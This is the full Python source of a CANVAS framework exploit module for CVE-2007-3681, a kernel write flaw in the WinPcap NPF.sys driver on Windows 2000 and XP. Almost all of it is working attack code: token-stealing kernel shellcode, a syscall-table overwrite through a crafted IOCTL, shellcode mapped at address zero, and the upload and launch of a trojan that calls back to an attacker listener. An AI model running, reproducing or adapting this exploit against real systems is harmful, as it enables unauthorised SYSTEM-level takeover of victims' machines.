#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2005
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

import os,getopt
import socket
import time

from exploitutils import *

from canvasexploit import canvasexploit
import canvasengine
import random
from canvaserror import *

from shelllistener import *
from win32MosdefShellServer import TokenPrimary
from ExploitTypes.localexploit import LocalExploit

NAME="winpcap"
DESCRIPTION="A vulnerability in the way NPF.sysd handles IOCTL arguments allows for writing to kernel space"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="WinPcap.org"
DOCUMENTATION["Date public"]="07/09/2007"
DOCUMENTATION["CVE Name"] = "CVE-2007-3681"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3681"
DOCUMENTATION['CVSS'] = 6.6
DOCUMENTATION["URL"]="http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=550"
DOCUMENTATION["Notes"]="""

This exploit will auto-target based on reading a kernel file on Windows 2000
or XP. It will generate a target fingerprint when you run the auto-targeter -
this is useful when you don't have read access to the kernel files and still want
to run the exploit. It will leave a SYSTEM token as your current token, if it succeeds

#example commandline usage on Windows 2000 SP4 English 
#we set our callback IP to 10.10.10.6 in the test lab
runmodule winpcap -l 10.10.10.6 -d 5555

Make sure you have a listener listening already before you run the above
command.
./commandlineInterface -v 1 -p 5555

If you get the wrong version, (-v 1 on an XP box, say) you'll see an ACCESS_VIOLATION
bluescreen. Then it will dump memory.

"""
Notes="""
The bug looks like this:
                pStats = (PUINT)(Irp->UserBuffer);

                pStats[3] = 0;
                pStats[0] = 0;
                pStats[1] = 0;
                pStats[2] = 0;          // Not yet supported

                for(i = 0 ; i < NCpu ; i++)
                {

                        pStats[3] += Open->CpuData[i].Accepted;
                        pStats[0] += Open->CpuData[i].Received;
                        pStats[1] += Open->CpuData[i].Dropped;
                        pStats[2] += 0;         // Not yet supported
                }

We should always use pStats[2] since that will always be zero.
"""

VERSION="1.0"

PROPERTY={}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Local"
PROPERTY['ARCH'] = [ ["Windows"] ]

NOTES="""
Commandline example use:
runmodule winpcap -v 1 -t 1 -l 10.10.10.6 -d 5555

"""

METHOD_BUFFERED=0
METHOD_IN_DIRECT=1
METHOD_OUT_DIRECT=2
METHOD_NEITHER=3
FILE_DEVICE_PROTOCOL=0x8000


def CTL_CODE(DeviceType, Function, Method, Access ):
    return ((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method)

from win32MosdefShellServer import FILE_ANY_ACCESS
IOCTL_PROTOCOL_RESET=CTL_CODE(FILE_DEVICE_PROTOCOL, 3 , METHOD_BUFFERED, FILE_ANY_ACCESS)


W2K_PID_SYSTEM=8
W2K_OFF_PID=0x9c
W2K_OFF_FLINK=0xa0
W2K_OFF_TOKEN=0x12c
W2K_SYS_NtGdiDeleteObjectApp=0x1075
W2K_SYS_NtUserCloseDesktop=0x1142
W2K_MAX_GDI_TABLE_ENTRIES=0x4000

WXP_PID_SYSTEM=4
WXP_OFF_PID=0x84
WXP_OFF_FLINK=0x88
WXP_OFF_TOKEN=0xc8
WXP_SYS_NtGdiDeleteObjectApp=0x107a
WXP_SYS_NtUserCloseDesktop=0x114c
WXP_MAX_GDI_TABLE_ENTRIES=0x10000
#this shellcode will return our old token (which gets
#replaced by a system token) in EAX
#it takes no arguments
code_payload =  ""
code_payload += "\x64"    #/* mov eax,                  */
code_payload += "\xa1\x24\x01\x00\x00"    #/* [fs:OFF_ETHREAD]          */
code_payload += "\x8b\x40\x44"    #/* mov eax, [eax+OFF_EPROCESS]        */
code_payload += "\x89\xc1"    #/* mov ecx, eax                  */
code_payload += "\x8b\x80" + "XXXX"  #/* mov eax, [eax+OFF_FLINK]       */
code_payload += "\x2d" + "XXXX" #/* sub eax, OFF_FLINK          */
code_payload += "\x81\xb8" #/* cmp                              */
code_payload += "XXXX"  #/* dword [eax+OFF_PID],                */
code_payload += "XXXX"  #/* SYSTEM_PID                  */
code_payload += "\x75\xe9" #/* jnz FindSystemProcess    */
code_payload += "\x8b\x90" + "XXXX" #/* mov edx, [eax+OFF_TOKEN]        */
code_payload += "\x8b\x81" + "XXXX" #/* mov eax, [ecx+OFF_TOKEN]        */
code_payload += "\x89\x91" + "XXXX" #/* mov [ecx+OFF_TOKEN], edx        */
code_payload += "\xc3" #/* ret                          */

#this code takes three arguments and will restore the
#old token and the old system call
#you want to do this as soon as possible to avoid bluescreens!
code_restore = ""
code_restore +="\x64"  #/* mov eax,                     */
code_restore +="\xa1\x24\x01\x00\x00" #/* [fs:OFF_ETHREAD]              */
code_restore +="\x8b\x40\x44" #/* mov eax, [eax+OFF_EPROCESS]   */
code_restore +="\x8b\x4c\x24\x04" #/* mov ecx, [esp+4]          */
code_restore +="\x8b\x11" #/* mov edx, [ecx]            */
code_restore +="\x89\x90" + "XXXX" #/* mov [eax+OFF_TOKEN], edx   */
code_restore +="\x8b\x41\x04" #/* mov eax, [ecx+4]              */
code_restore +="\x8b\x51\x08" #/* mov edx, [ecx+8]              */
code_restore +="\x89\x10" #/* mov [eax], edx            */
code_restore +="\x8b\x51\x0c" #/* mov edx, [ecx+12]             */
code_restore +="\x89\x50\x04" #/* mov [eax+4], edx              */
#/*now restore function after our function*/
code_restore+="\x8b\x51\x0c"  #/* mov edx, [ecx+c] */
code_restore+="\x89\x50\x04"  #/* mov [eax+4], edx */
code_restore +="\xc3"   #/* ret                         */

from win32MosdefShellServer import win32shellserver

from MOSDEF.pelib import PElib

import struct 
            
#Version data for this exploit
#        dwSyscallAddr, dwOrigSysCall, dwOrigSysCall_plus
win2ksp4=(0xa016c700, 0xa006d6f2, 0xa006a1b0)
winxpsp2=(0xbf998300, 0xbf85d8d1, 0xbf85d993)
crash=(0x8851a1b8, 0x01020304, 0x01020304)

def getWin32pFromFile(filename, syscallnum):
    p=PElib()
    p.openfile(filename)
    #look in imports for keAddSystemServiceTable
    dwIAT=p.PE.getIAT("ntoskrnl.exe", "KeAddSystemServiceTable")
    if not dwIAT:
        #could not find the IAT in the file we've loaded
        return 0
    #print "dwIAT: %x"%dwIAT
    #In the INIT section there is a call to our function
    #print "p.PE.Sections: %s"%p.PE.Sections
    init=p.PE.Sections["INIT\x00\x00\x00\x00"]
    #print "init: %x"%init.VirtualAddress
    data=p.PE.getSectionData("INIT\x00\x00\x00\x00")
    offset=data.find("\xff\x15"+intel_order(dwIAT))
    if offset==-1:
        #did not find the call to our IAT address
        return 0
    #print "offset: %x"%offset
    #now find the push for W32pServiceTable
    #thereotically the push could be several instructions back!
    offset-=5
    if data[offset]!="\x68":
        print "No push where one is expected"
    offset+=1
    addy=str2int32_swapped(data[offset:offset+4])
    #if addy not in .data section, bail
    #print "addy: %x"%addy
    syscalltable=[]
    data=p.PE.data
    start=addy-p.PE.IMGOPThdr.ImageBase
    for i in xrange(0, syscallnum-0x1000+2):
        syscalltable+=[str2int32_swapped(data[start:start+4])]
        start+=4
    return addy, syscalltable
    

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name = NAME
        self.setVersions()
        self.uploaddir=None
        self.use_local_interface = False
    
    def setVersions(self):
        self.versions={}
        self.versions[0]=("Automatic")
        self.versions[1]=("Windows 2000 SP4 English", win2ksp4)
        self.versions[2]=("Windows XP SP2 English", winxpsp2)
        self.versions[3]=("Crash", crash)

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def getargs(self):
        self.uploaddir=self.argsDict.get("uploaddir",self.uploaddir)
        return 

    def DeviceIoControlAddress(self, node, hDevice,IoControlCode,InBuffer=None,InBufferSize=0,OutBuffer=None,OutBufferSize=0):
        vars={}
        vars['hDevice']=hDevice
        vars['IoControlCode']=IoControlCode
        vars['InBuffer']=InBuffer
        vars['InBufferSize']=InBufferSize
        vars['OutBuffer']=OutBuffer
        vars['OutBufferSize']=OutBufferSize
        code="""
        #import "remote","kernel32.dll|DeviceIoControl" as "DeviceIoControl"
        #import "local","sendint" as "sendint"
        #import "int","hDevice" as "hDevice"
        #import "int","IoControlCode" as "IoControlCode"
        #import "string","InBuffer" as "InBuffer"
        #import "int","InBufferSize" as "InBufferSize"
        #import "int","OutBuffer" as "OutBuffer"
        #import "int","OutBufferSize" as "OutBufferSize"

        void main() {
          int ret;
          int cb;

          ret=DeviceIoControl(hDevice,IoControlCode,InBuffer,InBufferSize,OutBuffer,OutBufferSize,&cb,0);
          sendint(ret);
        }
        """
        node.shell.clearfunctioncache()
        request=node.shell.compile(code,vars)
        node.shell.sendrequest(request)
        ret=node.shell.readint()
        node.shell.leave()
        return ret
    
    def getWin32pServiceTable(self, node, syscallnum):
        """
        Download WIN32K.SYS, parse it a bit and return
        the location of Win32pServiceTable
        
        if we are successful we return the addy, and syscalltable up to syscallnum+1
        """
        #first, get the SYSTEMROOT
        isinstance(node.shell, win32shellserver)
        systemroot=node.shell.GetEnvironmentVariable("SystemRoot")
        if not systemroot:
            self.log("Could not get SystemRoot!")
            return None
        
        self.log("SystemRoot=%s"%prettyprint(systemroot))
        filename=systemroot+"\\SYSTEM32\\WIN32K.SYS"
        #download this file
        #this means we REQUIRE file read access.
        #while many users will have file read access
        #others (such as remote anonymous users)
        #will not! 
        #so this is not optimal
        #but oh well.
        outfilename="WIN32K.SYS_%d"%random.randint(0,50000)
        try:
            ret=node.shell.download(filename, outfilename)
        except NodeCommandError, i:
            self.log("Could not download %s: %s" % (filename, str(i)))
            return None
        
        self.log("Read WIN32K.SYS - now parsing it")
        ret=getWin32pFromFile(outfilename, syscallnum )
        os.unlink(outfilename)
        if not ret:
            self.log("Could not get syscall table from file!")
            return None 
        addy, syscalltable=ret 
        self.log("Success at getting Win32pServiceTable!")
        return addy, syscalltable
        
    def test(self):
        """
        Test that opens the device - if we can open it, we
        might be vulnerable (if version is < enough.)

        TODO: Also check the version of the DLL of NPF.sys
        
        """
        node=self.argsDict["passednodes"][0]
        from win32MosdefShellServer import HKEY_LOCAL_MACHINE
        from win32MosdefShellServer import KEY_READ
        key=node.shell.RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\EAPOL\\Parameters\\General",KEY_READ)
        if not key:
            self.log("Could not open registery key for WinPCAP")
            return 0
        
        result=node.shell.RegQueryValueEx(key, "InterfaceList")
        #self.log("Result: %s %d"%(str(result), len(result)))

        iface=result[2]
        if not iface:
            self.log("Could not get interface from register")
            return 0
        
        index=iface.find("{")
        if index==-1:
            self.log("Invalid DEVICE :<")
            return 0

        index2=iface[index:].find("}")+index 
        device_name=iface[index:index2]
        device_name="\\\\.\\NPF_"+device_name+"}"
        self.log("Device name: %s"%device_name)
        
        from win32MosdefShellServer import GENERIC_READ
        from win32MosdefShellServer import GENERIC_WRITE
        from win32MosdefShellServer import OPEN_EXISTING
        device=node.shell.CreateFile(device_name, GENERIC_READ | GENERIC_WRITE, 0 , 0, OPEN_EXISTING, 0)
        if device==-1:
            self.log("Could not open device")
            return 0
        self.log("Opened device")
        #no handle leak
        node.shell.CloseHandle(device)
        self.log("Closed device again")
        return 1

    def memcpy(self, node, address, data):
        vars={}
        vars["address"] = address 
        vars["data"]    = data
        vars["size"]    = len(data)

        code="""
        //start of code
        #import "local","memcpy" as "memcpy"
        #import "int", "address" as "address"
        #import "int", "size" as "size"
        #import "string", "data" as "data"

        void main() 
        {
           memcpy(address, data, size);
        }
        """
        node.shell.clearfunctioncache()
        devlog("cparse", "MEMCPY Code: %s VARS: %s"%(code, vars))
        request=node.shell.compile(code,vars)
        node.shell.sendrequest(request)
        node.shell.leave()
    
    def write4(self, node, addy):
        """
        Writes a zero into an address you specify.
        """

        from win32MosdefShellServer import HKEY_LOCAL_MACHINE
        from win32MosdefShellServer import KEY_READ
        key=node.shell.RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\EAPOL\\Parameters\\General",KEY_READ)
        if not key:
            self.log("Could not open registery key for WinPCAP")
            return 0
        
        result=node.shell.RegQueryValueEx(key, "InterfaceList")
        #self.log("Result: %s %d"%(str(result), len(result)))

        iface=result[2]
        if not iface:
            self.log("Could not get interface from register")
            return 0
        
        index=iface.find("{")
        if index==-1:
            self.log("Invalid DEVICE :<")
            return 0

        index2=iface[index:].find("}")+index 
        device_name=iface[index:index2]
        device_name="\\\\.\\NPF_"+device_name+"}"
        self.log("Device name: %s"%device_name)
        
        from win32MosdefShellServer import GENERIC_READ
        from win32MosdefShellServer import GENERIC_WRITE
        from win32MosdefShellServer import OPEN_EXISTING
        device=node.shell.CreateFile(device_name, GENERIC_READ | GENERIC_WRITE, 0 , 0, OPEN_EXISTING, 0)
        if device==-1:
            self.log("Could not open device")
            return 0
        self.log("Opened device")
        
        from win32MosdefShellServer import IOCTL_BIOCGSTATS
        ret,data=node.shell.DeviceIoControl(device, IOCTL_BIOCGSTATS)
        if ret==0:
            self.log("Bad DeviceIoControl, sorry")
            return 0
        self.log("Data=%s"%prettyhexprint(data))

        #perform Write4
        self.log("Trying to perform write4...")
        #mov [eax + 0xc], edi where eax=addy and edi=0
        ret=self.DeviceIoControlAddress(node, device,IOCTL_BIOCGSTATS,None,0,addy,16)
        #now try to get function pointer called.
        #ret=node.shell.DeviceIoControlAddress(device,IOCTL_PROTOCOL_RESET,None,0,addy,16)
        self.log("Write4 performed.")
        return 1
    
    def run_attack(self, node):
        """
        Run the attack on this node
        """
        self.node=node
        nodename=node.getname()

        ret,nodeos=node.shell.GetVersionEx()
        self.log("Checking our initial token")
        self.log("Setting thread token to primary token for this process")
        self.exploitnodes("setthreadtoken",[node],{"token":0})
        self.log("Finding out who we are...")
        whoami=self.exploitnodes("whoami",[node])[0]
        self.log("Currently running as: %s"%whoami)
        
        if whoami.count("$"):
            #bad on non-english, but whatever
            self.log("We're already system and you're running this exploit?")
            self.log("Assuming you know better...continuing")
            
        if self.uploaddir:
            uploaddirs=[self.uploaddir]
        else:
            uploaddirs=None

        ret=self.uploadmosdeftrojan("Windows", uploaddirs=uploaddirs, node=node)

        if not ret:
            self.log("Could not upload mosdef trojan! :<")
            return 0

        mosdef_filename=ret
        
        my_code_payload=code_payload[:]
        my_code_restore=code_restore[:]
        
        #returns (ret , dictionary of (major, minor))
        if not ret:
            self.log("Could not get os on node %s"%nodename)
            return 0
        minor=nodeos["Minor Version"]
        major=nodeos["Major Version"]
        self.log("Attacking Windows Major %x Minor %x"%(major,minor))
        if major!=5 or minor>1:
            self.log("This exploit is only for Windows 2000 and Windows XP")
            return 0
        
        if minor==0:
            self.log("Windows 2000 selected")
            SYS_NtGdiDeleteObjectApp = W2K_SYS_NtGdiDeleteObjectApp
            SYS_NtUserCloseDesktop = W2K_SYS_NtUserCloseDesktop
            dwMaxGdiTableEntries = W2K_MAX_GDI_TABLE_ENTRIES
            
            my_code_payload=stroverwrite(my_code_payload,intel_order(W2K_OFF_FLINK), 13)
            my_code_payload=stroverwrite(my_code_payload,intel_order(W2K_OFF_FLINK), 18)
            my_code_payload=stroverwrite(my_code_payload,intel_order(W2K_OFF_PID), 24)
            my_code_payload=stroverwrite(my_code_payload,intel_order(W2K_PID_SYSTEM), 28)
            my_code_payload=stroverwrite(my_code_payload,intel_order(W2K_OFF_TOKEN), 36)
            my_code_payload=stroverwrite(my_code_payload,intel_order(W2K_OFF_TOKEN), 42)
            my_code_payload=stroverwrite(my_code_payload,intel_order(W2K_OFF_TOKEN), 48)

            my_code_restore=stroverwrite(my_code_restore,intel_order(W2K_OFF_TOKEN), 17)
        else:
            self.log("Using XP Version")
            SYS_NtGdiDeleteObjectApp = WXP_SYS_NtGdiDeleteObjectApp
            SYS_NtUserCloseDesktop = WXP_SYS_NtUserCloseDesktop
            dwMaxGdiTableEntries = WXP_MAX_GDI_TABLE_ENTRIES
            my_code_payload=stroverwrite(my_code_payload,intel_order(WXP_OFF_FLINK), 13)
            my_code_payload=stroverwrite(my_code_payload,intel_order(WXP_OFF_FLINK), 18)
            my_code_payload=stroverwrite(my_code_payload,intel_order(WXP_OFF_PID), 24)
            my_code_payload=stroverwrite(my_code_payload,intel_order(WXP_PID_SYSTEM), 28)
            my_code_payload=stroverwrite(my_code_payload,intel_order(WXP_OFF_TOKEN), 36)
            my_code_payload=stroverwrite(my_code_payload,intel_order(WXP_OFF_TOKEN), 42)
            my_code_payload=stroverwrite(my_code_payload,intel_order(WXP_OFF_TOKEN), 48)

            my_code_restore=stroverwrite(my_code_restore,intel_order(WXP_OFF_TOKEN), 17)

        if self.version==0:
            self.log("Determining address to overwrite")
            #download WIN32K.sys and find the KeAddServiceTable
            #then do some minor parsing to find Win32pServiceTable
            #do this with PELib.py

            ret=self.getWin32pServiceTable(node, SYS_NtUserCloseDesktop)
            if not ret:
                self.log("Could not get syscall table!")
                return 0
            win32pServiceTable, syscalltable=ret
            dwOrigSyscall=syscalltable[SYS_NtUserCloseDesktop-0x1000]
            dwOrigSyscall_plus=syscalltable[SYS_NtUserCloseDesktop-0x1000+1]
            self.log("This version of windows: (0x%x, 0x%x, 0x%x)"%(win32pServiceTable, dwOrigSyscall, dwOrigSyscall_plus))
        else:
            win32pServiceTable, dwOrigSyscall, dwOrigSyscall_plus=self.versions[self.version][1]
        
        dwSysCallAddr = win32pServiceTable+(SYS_NtUserCloseDesktop-0x1000)*4
        self.log("Win32pServiceTable=%x"%win32pServiceTable)
        self.log("dwSysCallAddr=%x"%dwSysCallAddr)
        
        #allocate space for shellcode
        mapaddress=0
        ret=node.shell.NtAllocateVirtualMemory(mapaddress)
        if ret!=0:
            self.log("NtAllocateVirtualMemory Failed!")
            #return 0
            self.log("Someone's already mapped address zero")
            #let's hope it's writable! This only happens
            #when you run the exploit twice...
            #TODO: make sure it's writable

        #now copy shellcode into address 0
        self.memcpy(node, 0, my_code_payload)
        
        self.log("Triggering write4 into kernel space")
        ret=self.write4(node, dwSysCallAddr)
        if not ret:
            self.log("Could not perform write4!")
            return 0
        
        
        self.log("Calling NTUserCloseDesktop to call our shellcode")
        #the shellcode returns our token, how nice!
        dwOldToken=node.shell.RawSyscall(SYS_NtUserCloseDesktop, 0) #the zero here is no argument
        self.log("Old token=%x"%dwOldToken)

        self.log("We should be system...")
        ret=self.exploitnodes("whoami", [node])[0]
        if ret.count("$"): 
            #this won't work on non-english systems I bet.
            self.log("System! :>") 
            
        #now our payload where we do something before we restore
        #the system. You want to restore before someone else calls NtUserCloseDesktop
        #which will bluescreen the box (as it will call 0x2 for no good reason)
        #if self.payload=="getnewtoken": ...
        #get a new impersonation token as local system, and use it
        method="process"
        if method=="token":
            token=node.shell.openprocesstoken()
            self.log("GetProcessToken returned %x"%token)
            ret, processtoken=node.shell.DuplicateToken(token, TokenType=TokenPrimary)
            if ret:
                self.log("New process token: %x"%processtoken)
            ret, newtoken=node.shell.DuplicateToken(token)
            if ret:
                node.shell.SetThreadToken(newtoken)
                self.log("Set new token to a duplicated system token: %x"%newtoken)
            else:
                self.log("ERROR: Could not duplicate token!")
        
        if method=="process":
            ret=node.shell.dospawn(mosdef_filename)

        self.log("Restoring tokens and syscalls")
        self.memcpy(node, 0x0, my_code_restore)

        arguments=intel_order(dwOldToken)+intel_order(dwSysCallAddr)+intel_order(dwOrigSyscall)+intel_order(dwOrigSyscall_plus)
        #copy this into the 0th section of ram, just as scratch space
        argAddr=0x500
    
        self.memcpy(node, argAddr, arguments)
        
        self.log("Calling NTUserCloseDesktop")
        node.shell.RawSyscall(SYS_NtUserCloseDesktop, argAddr)
        if method=="token":
            self.log("We should still be system...")
            self.exploitnodes("whoami", [node])
    
            #setthreadtoken the last token 
            #as side effect
            self.log("Original token should be restored as token 0")
            self.exploitnodes("getthreadsinfo", [node])
            
            #reset our token back to local system token
            node.shell.SetThreadToken(newtoken)


        #virtualfree(1)
        if method=="process":
            time.sleep(3)
            ret=self.ISucceeded()
        else:
            ret=1
        return ret 
    
    def run(self):
        """
        This run happens on all nodes selected
        returns 1 if we succeed on any node
        """
        self.setInfo("%s (in progress)"%(NAME))
        self.getargs()
        success=0 
        for node in self.argsDict["passednodes"]:            
            type = node.nodetype
            nodename=node.getname()
            caps= node.capabilities
            if "win32api" not in caps:
                self.log("Node %s not a Win32 node..."%nodename)
                continue
            ret=self.run_attack(node)
            if ret:
                success=1
        return success

if __name__=="__main__":
    print "This win32 local module is meant to be run only within CANVAS"
    from win32MosdefShellServer import FILE_ANY_ACCESS
    IOCTL_PROTOCOL_RESET=CTL_CODE(FILE_DEVICE_PROTOCOL, 3 , METHOD_BUFFERED, FILE_ANY_ACCESS)
    print "IOCTL_PROTOCOL_RESET=%x"%IOCTL_PROTOCOL_RESET
    #ret=getWin32pFromFile(outfilename, W2K_SYS_NtUserCloseDesktop)
    #if ret:
    #    syscalltable=ret[1]
    #    print "NtUserCloseDesktop=%x"%(syscalltable[W2K_SYS_NtUserCloseDesktop-0x1000])
